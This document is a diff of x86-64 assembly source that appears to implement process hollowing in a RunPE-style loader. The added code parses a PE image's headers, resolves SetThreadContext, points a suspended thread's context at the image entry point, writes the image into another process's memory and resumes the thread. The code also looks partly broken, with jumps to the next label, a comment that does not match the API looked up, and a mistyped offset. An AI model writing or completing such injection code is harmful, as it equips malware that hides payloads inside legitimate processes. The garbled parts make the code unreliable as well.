@@ -165,8 +165,9 @@ section .data
     lpImageBase times 8                              dd 0
     VA times 8                                       dd 0
     lpAllocatedBaset times 8                         dd 0
-	
+	PE times 8                                       dq 0
 	lpPreferableBase dd 0x400000
+	
 section .codered
 	CodeRed:
 	Buffer2 times 800000                          db 0
@@ -413,31 +414,88 @@ section .deccode
 			call r12
 			mov rbx, r15
 			mov [allocex],rax
-								   
-                                
-	call Locate_kernel32 
-	mov rbp,rbx
-	mov rsi, r13      
-	call GetProcAddres
-	mov rbx, r15
-	mov r15, r9
+			
+			mov [rbp+0x710], Rax
+			mov rax, [rbp+0x710]
+			test rax,Rax
+			sete al
+			test al, al
+			je Decisao
 
-	call LoadLibrary
-	mov r13, r15
-	;Load kernelbase.dll
-	mov rax, "se.dll"     
-	push rax
-	mov rax, "kernelba"
-	push rax
-	mov rcx, rsp
-	sub rsp, 0x30
-	call rsi
-	mov r15,rax
-	add rsp, 0x30
-	add rsp, 0x10
+		Decisao:
+			mov [rbp+710], Rax
+			mov rax, [rbp+0x710]
+			cmp [lpImageBase], rax
+			je Decisao2
+			
+		Decisao2:
+			xor Rcx,Rcx
+			xor rax,Rax
+			xor rdi,rdi
+			mov rax, [lpImageBase]
+			mov rcx, [lpImageBase]
+			add rax, 0x3c
+			mov edx, [eax]
+			mov rax, Rcx
+			add eax, edx
+			mov [PE], rax
+			
+			xor rax,Rax
+			mov rax, [PE]
+			mov [rax+0x5C], word 0x02
+			mov rdx, [lpImageBase]
+			mov rax, [lpImageBase]
+			je SetWrite
+			
+			
+		SetWrite:
+			call Locate_kernel32
+			;lookup GetThreadContext
+			mov rax, "dContext"
+			push Rax
+			mov rax, "SetThrea" 
+			push rax
+			mov [rsp+0x10], dword 0x00
+			lea rdx, [rsp]
+			mov rcx, r8
+			sub rsp, 0x30
+			call R14
+			add rsp,0x30
+			add rsp,0x10
+			mov r12, rax
+		
+			mov rax, [PE]
+			mov eax, dword [rax+0x28]
+			mov edx, eax
+			mov rax, [lpImageBase]
+			add rax,RDX
+			mov [ctx+CONTEXT.Rdx], Rax
+			mov rax, [ProcInfo+PROCESSINFO.hThread]
+			lea rdx, [ctx+CONTEXT.P1Home]
+			mov rcx, Rax
+			call r12
+			
+			
+			
+			call Locate_kernel32 
+		   ;call GetProcAddres
+
+			call LoadLibrary
+			mov r13, r15
+			;Load kernelbase.dll
+			mov rax, "se.dll"     
+			push rax
+			mov rax, "kernelba"
+			push rax
+			mov rcx, rsp
+			sub rsp, 0x30
+			call rsi
+			mov r15,rax
+			add rsp, 0x30
+			add rsp, 0x10
 	
 	
-	;delta
+	      ;delta
 
 
 	WriteProcess:
@@ -456,16 +514,21 @@ section .deccode
 		add rsp, 0x30
 
 		;call WriteProcessMemory
-		mov r9d,[GetSizeTarget]
+		mov rax, [PE]
+		mov eax, dword[rax+0x54]
+		mov r9d,eax
 		xor ebx,ebx
-		mov r8,[lpPebImageBase]
+		mov r8,[lpImageBase]
 		mov [rsp+0x20], rbx
-		mov rdx, [allocex]
-		mov rcx, [openProcessH]
+		mov rdx, [lpPebImageBase]
+		mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 		call r12
 		mov rbp, rax
-		add rsp, 0x30     
-	   
+		add rsp, 0x30
+				  
+	
+	
+	;delta   
 	Resume:
 		call Locate_kernel32 
 		mov rax, "read"
